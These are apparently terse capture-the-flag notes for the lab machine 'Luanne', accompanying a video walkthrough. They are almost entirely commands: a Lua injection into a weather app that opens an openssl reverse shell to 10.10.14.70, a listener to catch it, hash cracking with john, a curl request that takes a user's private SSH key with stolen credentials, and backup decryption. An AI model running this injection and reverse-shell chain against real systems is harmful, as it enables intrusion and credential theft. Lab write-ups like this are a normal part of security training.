---
description: 'Notes for https://youtu.be/TlFmnbEAi1s'
---

# Luanne

## User

### Weather app injection

```text
'+..+os.execute("mkfifo+/tmp/s%3b+/bin/sh+-i+<+/tmp/s+2>%261+|+openssl+s_client+-quiet+-connect+10.10.14.70%3a1337+>+/tmp/s%3b+rm+/tmp/s")+..+'
```

Catch openssl shell:

```text
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
```

### Crack hash from .htpasswd

```text
john -w=~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
```

### Request private key

```text
curl http://webapi_user:iamthebest@localhost:3001/~r.michaels/id_rsa
```

## Root

### Decrypt

```text
netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc
```

